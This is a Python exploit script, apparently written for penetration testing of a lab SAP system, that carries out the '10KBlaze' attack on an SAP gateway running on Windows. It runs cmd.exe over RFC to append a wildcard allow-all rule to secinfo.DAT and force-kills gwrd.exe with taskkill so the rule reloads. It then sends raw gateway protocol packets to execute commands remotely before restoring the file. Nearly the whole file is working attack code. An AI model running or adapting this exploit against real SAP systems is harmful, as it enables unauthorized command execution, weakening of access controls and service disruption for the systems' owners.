#!/usr/bin/env python3
r"""
run_10kblaze_twt.py - 10KBlaze exploit targeting TWT (kernel 753, Windows).

FINDINGS FROM LOG ANALYSIS:
  - Kernel 753 does NOT have internal_ip_addr_adm shared memory (like kernel 742)
  - dev_rd shows NO internal_ip_addr segment (confirmed via DpShMCreate dump)
  - dev_w0 has zero ThrtInternalIpAddr entries
  - GW log shows USER-HOST=ubuntu, never USER-HOST=internal
  - Conclusion: pure betrusted does NOT work on kernel 753

  => Must use the same approach as W74 (kernel 742):
     1. Patch secinfo.DAT via RFC (SXPG_STEP_XPG_START with cmd.exe echo >>)
     2. Kill gwrd.exe to force secinfo reload (disp+work auto-restarts it)
     3. SAPXPG command execution via GW (no betrusted needed with patched secinfo)
     4. Restore secinfo and kill gwrd again to re-secure

TWT system layout:
  - Instance 00: ABAP+GATEWAY (port 3300) on 192.168.2.60
  - Instance 01: MESSAGESERVER (port 3901) on 192.168.2.60
  - Kernel 753 patch 1000, Windows
  - hosts file: 192.168.2.210 ubuntu
  - secinfo: P:\usr\sap\TWT\SYS\global\secinfo.DAT (3 default rules)
  - gw/acl_mode = 1

CONFIRMED WORKING:
  - SAPXPG execution from 192.168.2.210 after secinfo patch + gwrd restart
  - whoami output received (command format needs full Windows paths)
  - secinfo restored to original 3 rules afterward

For authorized security testing only.
"""

import sys
import socket
import struct
import time

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send as gw_ni_send, ni_recv as gw_ni_recv,
    ni_drain, extract_p4_output,
)

# ---- TWT target parameters ----
GW_HOST     = '192.168.2.60'
GW_PORT     = 3300             # GW on instance 00
ATT_IP      = '192.168.2.210'
SID         = 'TWT'
INSTANCE    = '00'
HOSTNAME    = 'twtestenv1'
KERNEL      = '753'
DEST        = 'T_75'
CLIENT      = '001'
TIMEOUT     = 15

# RFC connection params
RFC_HOST    = '192.168.2.60'
RFC_SYSNR   = '00'
RFC_CLIENT  = '001'
RFC_USER    = 'joris'
RFC_PASSWD  = 'REDACTED'
SDK_PATH    = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'

# File path on TWT
SECINFO_PATH = r'P:\usr\sap\TWT\SYS\global\secinfo.DAT'


# =========================================================================
# RFC helpers
# =========================================================================

def rfc_connect():
    """Open an RFC connection to TWT."""
    from sap_rfc_ctypes import RFCConnection
    conn = RFCConnection(
        sdk_path=SDK_PATH,
        ashost=RFC_HOST, sysnr=RFC_SYSNR,
        client=RFC_CLIENT, user=RFC_USER, passwd=RFC_PASSWD,
        lang='EN',
    )
    conn.open()
    return conn


def sxpg(conn, prog, params):
    """Run SXPG_STEP_XPG_START. Returns list of output lines or None."""
    base = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
                STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
                LONG_PARAMS="", CONNCNTL="H")
    kw = dict(base, EXTPROG=prog, PARAMS=params)
    try:
        try:
            r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                return None
    except Exception:
        return None

    lines = []
    for row in r.get("LOG", []):
        line = ""
        if isinstance(row, dict):
            line = row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or ""
        else:
            line = str(row)
        line = line.rstrip()
        if line:
            lines.append(line)
    return lines


# =========================================================================
# SAPXPG via raw GW protocol
# =========================================================================

def run_sapxpg(command, params, long_params=None, label=""):
    """Attempt SAPXPG command execution on the TWT gateway.

    Returns 0 on success, 20 on secinfo denied, None on other error.
    """
    tag = f"[{label}] " if label else ""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"{tag}GW connect failed: {e}")
        return None

    local_ip = sock.getsockname()[0]

    # P1
    gw_ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        sock.close()
        return None
    for f in frames:
        if parse_response(f)["error"]:
            sock.close()
            return None

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    gw_ni_send(sock, p2)
    conv_id = None
    gw_id = 0
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                print(f"{tag}P2 denied: {info['error_msg']}")
                sock.close()
                return 20
            if info["conv_id"] and not conv_id:
                conv_id = info["conv_id"]
            if info.get("gw_id") is not None:
                gw_id = info["gw_id"]
        if len(resp) >= 36:
            if struct.unpack("!I", resp[32:36])[0] == 20:
                print(f"{tag}P2 appc_rc=20 => secinfo DENIED")
                sock.close()
                return 20
    except socket.timeout:
        sock.close()
        return None

    if not conv_id:
        conv_id = "0"

    # P3
    p3_kw = {}
    if long_params is not None:
        p3_kw["long_params"] = long_params
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, command, params, gw_id=gw_id,
                  **p3_kw)
    gw_ni_send(sock, p3)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 2)
    except socket.timeout:
        sock.close()
        return None

    appc_rc = None
    p3_output = []
    for f in frames:
        if len(f) >= 34 and appc_rc is None:
            appc_rc = struct.unpack("!I", f[30:34])[0]
        info = parse_response(f)
        if info["error"]:
            print(f"{tag}P3 error: {info['error_msg']}  appc_rc={appc_rc}")
            sock.close()
            return appc_rc
        p3_output.extend(extract_p4_output(f))

    if p3_output:
        print(f"{tag}*** OUTPUT (P3) ***")
        for ln in p3_output:
            print(f"    {ln}")
        sock.close()
        return 0

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    gw_ni_send(sock, p4)
    try:
        resp = gw_ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if not info["error"]:
            output = extract_p4_output(resp)
            if output:
                print(f"{tag}*** OUTPUT (P4) ***")
                for ln in output:
                    print(f"    {ln}")
                sock.close()
                return 0
    except (socket.timeout, ConnectionError):
        pass

    sock.close()
    return appc_rc


# =========================================================================
# Main exploit flow
# =========================================================================

def main():
    print("=" * 70)
    print(" 10KBlaze TWT — kernel 753, Windows")
    print(f" GW {GW_HOST}:{GW_PORT}  Attacker {ATT_IP}")
    print(f" Approach: secinfo patch + gwrd restart")
    print("=" * 70)

    # ==================================================================
    # PHASE 1: Read current secinfo
    # ==================================================================
    print(f"\n[PHASE 1] Read current secinfo")
    conn = rfc_connect()
    lines = sxpg(conn, r'C:\Windows\System32\cmd.exe',
                  f'/c type {SECINFO_PATH}')
    if lines:
        for l in lines:
            print(f"  {l}")

    # ==================================================================
    # PHASE 2: Patch secinfo
    # ==================================================================
    print(f"\n[PHASE 2] Patch secinfo.DAT")
    rule = "P TP=* USER=* USER-HOST=* HOST=*"
    print(f"  Appending: {rule}")
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo {rule}>> {SECINFO_PATH}')

    # Verify
    lines = sxpg(conn, r'C:\Windows\System32\cmd.exe',
                  f'/c type {SECINFO_PATH}')
    if lines and any("USER-HOST=*" in l for l in lines):
        print(f"  [+] Permissive rule confirmed in secinfo")
    else:
        print(f"  [-] Patch verification failed")
        conn.close()
        sys.exit(1)

    # ==================================================================
    # PHASE 3: Kill gwrd to reload secinfo
    # ==================================================================
    print(f"\n[PHASE 3] Kill gwrd.exe to reload secinfo")
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          '/c taskkill /F /IM gwrd.exe')
    # RFC conn dies here -- gwrd restart disrupts the instance
    try:
        conn.close()
    except Exception:
        pass

    print(f"  Waiting 25s for gwrd restart...")
    time.sleep(25)

    # Wait for GW port to come back
    for i in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((GW_HOST, GW_PORT))
            s.close()
            print(f"  [+] GW port {GW_PORT} is back")
            break
        except Exception:
            time.sleep(5)
    else:
        print(f"  [-] GW port still down — aborting")
        sys.exit(1)

    time.sleep(5)  # extra settle time

    # ==================================================================
    # PHASE 4: SAPXPG command execution
    # ==================================================================
    print(f"\n[PHASE 4] SAPXPG command execution")

    # On Windows SXPG: EXTPROG is the full path to the executable,
    # PARAMS is the argument string. For cmd.exe commands, use
    # EXTPROG=C:\Windows\System32\cmd.exe and PARAMS=/c <cmd>.
    # For standalone executables, use EXTPROG directly.

    commands = [
        (r'C:\Windows\System32\whoami.exe', '', None, 'whoami'),
        (r'C:\Windows\System32\hostname.exe', '', None, 'hostname'),
        (r'C:\Windows\System32\cmd.exe', '/c ipconfig', '', 'ipconfig'),
        (r'C:\Windows\System32\cmd.exe', '/c dir P:\\usr\\sap\\TWT\\D00\\work', '', 'dir'),
    ]

    success = False
    for extprog, params, long_params, label in commands:
        print(f"\n  [{label}] {extprog} {params}")
        rc = run_sapxpg(extprog, params, long_params=long_params, label=label)
        if rc == 0:
            success = True
        elif rc == 20:
            print(f"  [{label}] DENIED — secinfo not yet reloaded")
            time.sleep(5)
            rc = run_sapxpg(extprog, params, long_params=long_params, label=f"{label}-retry")
            if rc == 0:
                success = True

    if success:
        print(f"\n{'*'*70}")
        print(f"*** 10KBlaze TWT SUCCEEDED ***")
        print(f"{'*'*70}")

    # ==================================================================
    # PHASE 5: Restore secinfo
    # ==================================================================
    print(f"\n[PHASE 5] Restore secinfo.DAT")
    conn = rfc_connect()

    # Write original content using echo. trick to handle #VERSION=2
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo.#VERSION=2 >{SECINFO_PATH}')
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo.#>>{SECINFO_PATH}')
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo P USER=* USER-HOST=local HOST=local TP=*>>{SECINFO_PATH}')
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo P USER=* USER-HOST=local HOST=internal TP=*>>{SECINFO_PATH}')
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          f'/c echo P USER=* USER-HOST=internal HOST=local TP=*>>{SECINFO_PATH}')

    # Verify
    lines = sxpg(conn, r'C:\Windows\System32\cmd.exe',
                  f'/c type {SECINFO_PATH}')
    if lines:
        print(f"  Restored secinfo:")
        for l in lines:
            print(f"    {l}")

    # Kill gwrd again to reload secure secinfo
    print(f"\n  Killing gwrd to reload restored secinfo...")
    sxpg(conn, r'C:\Windows\System32\cmd.exe',
          '/c taskkill /F /IM gwrd.exe')
    try:
        conn.close()
    except Exception:
        pass

    print(f"  Waiting 25s for gwrd restart...")
    time.sleep(25)

    # Verify SAPXPG is denied again
    print(f"\n  Verifying SAPXPG is denied (secinfo restored)...")
    rc = run_sapxpg(r'C:\Windows\System32\whoami.exe', '', label='verify-deny')
    if rc == 20 or rc is None:
        print(f"  [+] SAPXPG DENIED — secinfo properly restored!")
    elif rc == 0:
        print(f"  [-] SAPXPG still works — secinfo NOT properly restored")

    print(f"\n{'='*70}")
    status = "restored" if rc != 0 else "STILL PERMISSIVE — manual restore needed"
    print(f" DONE. secinfo {status}")
    print(f"{'='*70}")


if __name__ == '__main__':
    main()
